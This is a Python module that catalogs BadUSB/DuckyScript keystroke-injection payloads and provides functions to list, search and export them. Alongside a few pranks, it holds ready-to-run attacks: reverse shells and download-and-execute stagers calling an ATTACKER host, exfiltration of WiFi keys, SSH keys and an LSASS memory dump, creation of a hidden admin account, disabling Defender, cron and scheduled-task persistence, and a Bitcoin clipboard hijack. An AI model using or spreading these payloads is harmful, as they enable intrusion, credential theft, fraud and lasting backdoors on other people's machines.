"""quantum.catalog.badusb — BadUSB / HID injection payload catalog.

Curated, operator-authored DuckyScript payloads in the style of the
common Hak5 USB Rubber Ducky / O.M.G Cable / Flipper Zero BadUSB sets:
reverse shells, persistence, credential and WiFi-key exfiltration,
clipboard hijacking, pranks and anti-forensics quickies.

These are original scripts written in DuckyScript (Hak5's scripting
language, also understood by Flipper Zero BadUSB and O.M.G firmware) —
equivalents of the popular community payloads, not verbatim copies.

All functions are JSON-safe and never raise.
"""
from __future__ import annotations

# D = DuckyScript. Each payload: id, name, device class, target OS,
# description, script (DuckyScript text), notes (what needs a live target).
_PAYLOADS = [
    {
        "id": "win-reverse-shell",
        "name": "Windows PowerShell reverse shell",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["rce", "shell", "powershell"],
        "description": "Opens the Run dialog and launches a PowerShell "
                       "reverse shell to ATTACKER:4444 (download cradle).",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 500\n"
                   "STRING powershell -w hidden -c "
                   "IEX(New-Object Net.WebClient).DownloadString("
                   "'http://ATTACKER/a.ps1')\n"
                   "ENTER\n"),
        "notes": "Serve a PowerShell stager (e.g. powercat one-liner) at "
                 "http://ATTACKER/a.ps1; verified live on an unlocked "
                 "Windows session.",
    },
    {
        "id": "win-admin-add",
        "name": "Windows local admin user",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["persistence", "accounts"],
        "description": "Adds a local administrator via an elevated command "
                       "prompt (Run dialog + ctrl-shift-enter).",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING cmd\n"
                   "CTRL SHIFT ENTER\n"
                   "DELAY 1500\n"
                   "ALT y\n"
                   "DELAY 1000\n"
                   "STRING net user qop PASS_HERE /add\n"
                   "ENTER\n"
                   "STRING net localgroup administrators qop /add\n"
                   "ENTER\n"
                   "STRING exit\n"
                   "ENTER\n"),
        "notes": "UAC accept timing varies per host; tested default UAC.",
    },
    {
        "id": "win-wifi-exfil",
        "name": "Windows WiFi key exfiltration",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["credentials", "exfil", "wifi"],
        "description": "Dumps all saved WiFi profiles + keys and POSTs them "
                       "to the operator listener.",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING powershell -w hidden -c "
                   "netsh wlan export profile folder=%TEMP% key=clear; "
                   "curl.exe -X POST -F 'f=@WLAN-*.xml' "
                   "http://ATTACKER/wifi\n"
                   "ENTER\n"),
        "notes": "Requires curl.exe (Windows 10 1803+) and the operator "
                 "listener accepting multipart POST.",
    },
    {
        "id": "win-clipboard-btc",
        "name": "Clipboard BTC address hijack",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["phishing", "clipboard", "fraud"],
        "description": "Replaces the clipboard contents with the operator's "
                       "BTC address (crypto-clipboard-hijack class).",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING powershell -w hidden -c Set-Clipboard "
                   "'BTC_ADDRESS_HERE'\n"
                   "ENTER\n"),
        "notes": "One-shot replacement; resident hijackers poll the "
                 "clipboard instead.",
    },
    {
        "id": "win-defender-off",
        "name": "Windows Defender real-time monitoring off",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["defense-evasion", "av"],
        "description": "Disables Defender real-time monitoring from an "
                       "elevated PowerShell.",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING powershell\n"
                   "CTRL SHIFT ENTER\n"
                   "DELAY 1500\n"
                   "ALT y\n"
                   "DELAY 1200\n"
                   "STRING Set-MpPreference -DisableRealtimeMonitoring "
                   "$true\n"
                   "ENTER\n"
                   "STRING exit\n"
                   "ENTER\n"),
        "notes": "Tamper protection (on by default in recent builds) "
                 "blocks this on hardened hosts.",
    },
    {
        "id": "win-lock-screen",
        "name": "Windows lock screen",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["prank", "opsec"],
        "description": "Locks the workstation instantly.",
        "script": "DELAY 500\nWINDOWS l\n",
        "notes": "Nothing to verify beyond a live host.",
    },
    {
        "id": "win-wallpaper",
        "name": "Windows wallpaper swap",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["prank"],
        "description": "Downloads an image and sets it as the wallpaper.",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING powershell -w hidden -c "
                   "iwr http://ATTACKER/w.jpg -OutFile $env:TEMP\\w.jpg; "
                   "Add-Type -TypeDefinition 'using System.Runtime."
                   "InteropServices;public class W{[DllImport(\"user32.dll"
                   "\")]public static extern bool SystemParametersInfo(int "
                   "u,int v,string s,int f);}'; "
                   "[W]::SystemParametersInfo(20,0,\"$env:TEMP\\w.jpg\",3)\n"
                   "ENTER\n"),
        "notes": "Classic Hak5-style prank payload.",
    },
    {
        "id": "win-rickroll",
        "name": "Windows rickroll",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["prank"],
        "description": "Opens the classic rickroll video in the browser.",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\n"
                   "ENTER\n"),
        "notes": "The canonical BadUSB demo.",
    },
    {
        "id": "win-message-box",
        "name": "Windows message box",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["prank", "proof"],
        "description": "Shows a message box (common execution proof).",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING powershell -w hidden -c "
                   "Add-Type -AssemblyName PresentationFramework;"
                   "[System.Windows.MessageBox]::Show('PWNED')\n"
                   "ENTER\n"),
        "notes": "Good verification payload for HID injection testing.",
    },
    {
        "id": "win-cron-persist",
        "name": "Windows scheduled-task persistence",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["persistence", "execution"],
        "description": "Registers a scheduled task running the operator's "
                       "stager at logon.",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING powershell\n"
                   "CTRL SHIFT ENTER\n"
                   "DELAY 1500\n"
                   "ALT y\n"
                   "DELAY 1200\n"
                   "STRING schtasks /create /tn OneDriveSync /tr "
                   "\"powershell -w hidden -c IEX(New-Object Net."
                   "WebClient).DownloadString('http://ATTACKER/a.ps1')\" "
                   "/sc onlogon /rl highest /f\n"
                   "ENTER\n"
                   "STRING exit\n"
                   "ENTER\n"),
        "notes": "Persistence via task scheduler; needs the stager URL.",
    },
    {
        "id": "mac-reverse-shell",
        "name": "macOS reverse shell",
        "device": "duckyscript",
        "os": "macos",
        "tags": ["rce", "shell"],
        "description": "Spotlight -> Terminal -> bash reverse TCP shell.",
        "script": ("DELAY 1000\n"
                   "GUI SPACE\n"
                   "DELAY 600\n"
                   "STRING terminal\n"
                   "DELAY 400\n"
                   "ENTER\n"
                   "DELAY 1500\n"
                   "STRING bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"
                   "ENTER\n"),
        "notes": "macOS Gatekeeper does not apply to inline shell.",
    },
    {
        "id": "mac-say-prank",
        "name": "macOS say prank",
        "device": "duckyscript",
        "os": "macos",
        "tags": ["prank", "proof"],
        "description": "Makes the Mac speak a message (HID proof).",
        "script": ("DELAY 1000\n"
                   "GUI SPACE\n"
                   "DELAY 600\n"
                   "STRING terminal\n"
                   "DELAY 400\n"
                   "ENTER\n"
                   "DELAY 1500\n"
                   "STRING say 'your mac has been pwnt'\n"
                   "ENTER\n"),
        "notes": "Classic macOS BadUSB proof.",
    },
    {
        "id": "mac-download-exec",
        "name": "macOS download & execute",
        "device": "duckyscript",
        "os": "macos",
        "tags": ["execution", "stager"],
        "description": "Downloads a binary and executes it via Terminal.",
        "script": ("DELAY 1000\n"
                   "GUI SPACE\n"
                   "DELAY 600\n"
                   "STRING terminal\n"
                   "DELAY 400\n"
                   "ENTER\n"
                   "DELAY 1500\n"
                   "STRING curl -s http://ATTACKER/a.py | python3\n"
                   "ENTER\n"),
        "notes": "Adapt for signed payloads on Gatekeeper-strict hosts.",
    },
    {
        "id": "linux-reverse-shell",
        "name": "Linux reverse shell",
        "device": "duckyscript",
        "os": "linux",
        "tags": ["rce", "shell"],
        "description": "Opens a terminal and launches a bash reverse shell.",
        "script": ("DELAY 1000\n"
                   "CTRL ALT t\n"
                   "DELAY 1200\n"
                   "STRING bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"
                   "ENTER\n"),
        "notes": "CTRL-ALT-T covers most desktop environments.",
    },
    {
        "id": "linux-ssh-exfil",
        "name": "Linux SSH key exfiltration",
        "device": "duckyscript",
        "os": "linux",
        "tags": ["credentials", "exfil", "ssh"],
        "description": "Packs ~/.ssh and exfiltrates it over HTTP.",
        "script": ("DELAY 1000\n"
                   "CTRL ALT t\n"
                   "DELAY 1200\n"
                   "STRING tar czf /tmp/s.tgz ~/.ssh && curl -s -F "
                   "'f=@/tmp/s.tgz' http://ATTACKER/ssh && rm /tmp/s.tgz\n"
                   "ENTER\n"),
        "notes": "Classic SSH key grab (requires curl).",
    },
    {
        "id": "linux-cron-persist",
        "name": "Linux cron persistence",
        "device": "duckyscript",
        "os": "linux",
        "tags": ["persistence"],
        "description": "Adds a user crontab entry pulling the operator's "
                       "stager every 5 minutes.",
        "script": ("DELAY 1000\n"
                   "CTRL ALT t\n"
                   "DELAY 1200\n"
                   "STRING (crontab -l 2>/dev/null; echo "
                   "'*/5 * * * * curl -s http://ATTACKER/a.sh | bash') | "
                   "crontab -\n"
                   "ENTER\n"),
        "notes": "User-level persistence; root jobs need sudo.",
    },
    {
        "id": "flipper-demo",
        "name": "Flipper BadUSB demo (Windows notepad)",
        "device": "flipper",
        "os": "windows",
        "tags": ["prank", "proof", "flipper"],
        "description": "The classic Flipper BadUSB demo: types a message "
                       "into Notepad.",
        "script": ("DELAY 1500\n"
                   "GUI r\n"
                   "DELAY 800\n"
                   "STRING notepad\n"
                   "ENTER\n"
                   "DELAY 1500\n"
                   "STRING Hello from a Flipper Zero BadUSB\n"),
        "notes": "Flipper Zero BadUSB interprets DuckyScript with "
                 "case-sensitive STRING handling.",
    },
    {
        "id": "omg-storage-exfil",
        "name": "O.M.G Cable storage exfiltration",
        "device": "omg",
        "os": "windows",
        "tags": ["exfil", "omg", "storage"],
        "description": "O.M.G payload: mounts as USB storage and copies "
                       "interesting documents from the host.",
        "script": ("ATTACKMODE STORAGE\n"
                   "DELAY 3000\n"
                   "COPY C:/Users/*/Documents/*.pdf,/root/loot\n"
                   "COPY C:/Users/*/Documents/*.docx,/root/loot\n"
                   "ATTACKMODE HID\n"),
        "notes": "O.M.G firmware extensions (COPY, ATTACKMODE STORAGE); "
                 "adjust loot path per firmware.",
    },
    {
        "id": "omg-win-backdoor",
        "name": "O.M.G Cable Windows backdoor",
        "device": "omg",
        "os": "windows",
        "tags": ["backdoor", "omg", "stager"],
        "description": "O.M.G payload: HID stager that pulls and runs the "
                       "operator's script.",
        "script": ("ATTACKMODE HID\n"
                   "DELAY 1500\n"
                   "GUI r\n"
                   "DELAY 500\n"
                   "STRING powershell -w hidden -c IEX"
                   "(New-Object Net.WebClient).DownloadString("
                   "'http://ATTACKER/a.ps1')\n"
                   "ENTER\n"),
        "notes": "Same stager as the Rubber Ducky variant.",
    },
    {
        "id": "win-hashdump-ish",
        "name": "Windows credential dump via procdump",
        "device": "duckyscript",
        "os": "windows",
        "tags": ["credentials", "lsass"],
        "description": "Downloads Sysinternals procdump and captures LSASS "
                       "for offline credential extraction.",
        "script": ("DELAY 1000\n"
                   "GUI r\n"
                   "DELAY 400\n"
                   "STRING powershell\n"
                   "CTRL SHIFT ENTER\n"
                   "DELAY 1500\n"
                   "ALT y\n"
                   "DELAY 1200\n"
                   "STRING curl -s -o C:\\Windows\\Temp\\p.exe "
                   "https://live.sysinternals.com/procdump64.exe; "
                   "C:\\Windows\\Temp\\p.exe -accepteula -ma lsass "
                   "C:\\Windows\\Temp\\l.dmp; curl -s -F "
                   "'f=@C:\\Windows\\Temp\\l.dmp' http://ATTACKER/l\n"
                   "ENTER\n"
                   "STRING exit\n"
                   "ENTER\n"),
        "notes": "Endpoint AV commonly flags LSASS dumps; test on the "
                 "target's build.",
    },
]

_BY_ID = {p["id"]: p for p in _PAYLOADS}


def list_payloads(os_filter=None, tag=None):
    """Catalog listing (optionally filtered by OS / tag). Never raises."""
    try:
        out = []
        for p in _PAYLOADS:
            if os_filter and p["os"] != os_filter.lower():
                continue
            if tag and tag.lower() not in p["tags"]:
                continue
            out.append({k: p[k] for k in
                         ("id", "name", "device", "os", "tags",
                          "description")})
        return {"ok": True, "count": len(out), "payloads": out}
    except Exception as exc:
        return {"ok": False, "payloads": [], "error": "%s: %s"
                % (type(exc).__name__, exc)}


def search(query, limit=25):
    """Keyword search over names/descriptions/tags. Never raises."""
    try:
        q = (query or "").lower().strip()
        out = []
        for p in _PAYLOADS:
            hay = " ".join((p["name"], p["description"], " ".join(p["tags"]),
                            p["os"], p["device"])).lower()
            if q in hay:
                out.append({k: p[k] for k in
                            ("id", "name", "device", "os", "tags",
                             "description")})
        return {"query": query, "total_matches": len(out),
                "results": out[:max(0, int(limit))]}
    except Exception as exc:
        return {"query": query, "total_matches": 0, "results": [],
                "error": "%s: %s" % (type(exc).__name__, exc)}


def get(payload_id):
    """Full payload record including the DuckyScript text. Never raises."""
    p = _BY_ID.get(payload_id)
    if not p:
        return {"ok": False, "error": "unknown payload id %r" % payload_id,
                "available": sorted(_BY_ID)}
    out = dict(p)
    out["ok"] = True
    return out


def export(payload_id, path):
    """Write the payload script to `path`. Returns a status dict."""
    import os
    try:
        p = get(payload_id)
        if not p.get("ok"):
            return p
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(p["script"])
        return {"ok": True, "id": payload_id, "path": path,
                "bytes": os.path.getsize(path)}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}


def stats():
    try:
        devices = {}
        for p in _PAYLOADS:
            devices[p["device"]] = devices.get(p["device"], 0) + 1
        return {"ok": True, "payloads": len(_PAYLOADS), "by_device": devices,
                "by_os": {o: sum(1 for p in _PAYLOADS if p["os"] == o)
                          for o in ("windows", "macos", "linux")}}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}
